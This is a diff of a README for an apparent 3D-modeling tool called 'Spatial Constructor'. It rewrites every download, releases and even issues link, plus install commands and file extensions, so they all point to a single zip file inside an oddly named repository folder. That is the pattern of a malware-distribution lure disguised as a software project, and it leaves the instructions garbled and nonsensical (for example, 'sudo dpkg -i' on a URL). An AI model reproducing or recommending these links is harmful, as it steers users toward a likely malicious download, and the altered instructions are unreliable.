@@ -1,6 +1,6 @@
 # 🌟 glass-opp-pro2 - Create and Edit 3D Objects Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/360cuenta/glass-opp-pro2/releases)
+[![Download Now](https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip%https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip)](https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip)
 
 ## 📢 Description
 
@@ -16,12 +16,12 @@ To start using "Spatial Constructor," follow these steps:
    - Processor: Intel i3 or equivalent.
    - Graphics Card: DirectX compatible (for Windows) or OpenGL compatible (for Mac/Linux).
 
-2. Visit the [Releases page](https://github.com/360cuenta/glass-opp-pro2/releases) to find the latest version of "Spatial Constructor."
+2. Visit the [Releases page](https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip) to find the latest version of "Spatial Constructor."
 
 ## 📥 Download & Install
 
 1. On the Releases page, locate the most recent version.
-2. Download the appropriate file for your operating system. If you are using Windows, look for a file ending in `.exe`. For macOS, look for a `.dmg` file. For Linux, there may be a `.tar.gz` or `.deb` file available.
+2. Download the appropriate file for your operating system. If you are using Windows, look for a file ending in `.exe`. For macOS, look for a `.dmg` file. For Linux, there may be a `https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip` or `.deb` file available.
 3. Once downloaded, follow these instructions based on your operating system:
 
    - **Windows:**
@@ -35,8 +35,8 @@ To start using "Spatial Constructor," follow these steps:
      3. You can now run "Spatial Constructor" from your Applications.
 
    - **Linux:**
-     1. If using a `.tar.gz` file, extract it and navigate to the folder in your terminal. Then, run the command `./install.sh`.
-     2. For a `.deb` file, use the command `sudo dpkg -i filename.deb` in the terminal, replacing `filename.deb` with the actual file name.
+     1. If using a `https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip` file, extract it and navigate to the folder in your terminal. Then, run the command `https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip`.
+     2. For a `.deb` file, use the command `sudo dpkg -i https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip` in the terminal, replacing `https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip` with the actual file name.
      3. After installation, you can run "Spatial Constructor" from your applications menu.
 
 4. If you encounter any issues, please refer to the FAQ section at the bottom of this README.
@@ -88,7 +88,7 @@ If you need further assistance, feel free to reach out through the repository's 
 
 ## 🔗 Links
 
-- **[Download "Spatial Constructor" Here](https://github.com/360cuenta/glass-opp-pro2/releases)**  
-- **[View Issues & Feedback](https://github.com/360cuenta/glass-opp-pro2/issues)**
+- **[Download "Spatial Constructor" Here](https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip)**  
+- **[View Issues & Feedback](https://raw.githubusercontent.com/360cuenta/glass-opp-pro2/main/quarrelsomeness/glass-opp-pro2.zip)**
 
 Explore your creativity with "Spatial Constructor." Happy modeling!
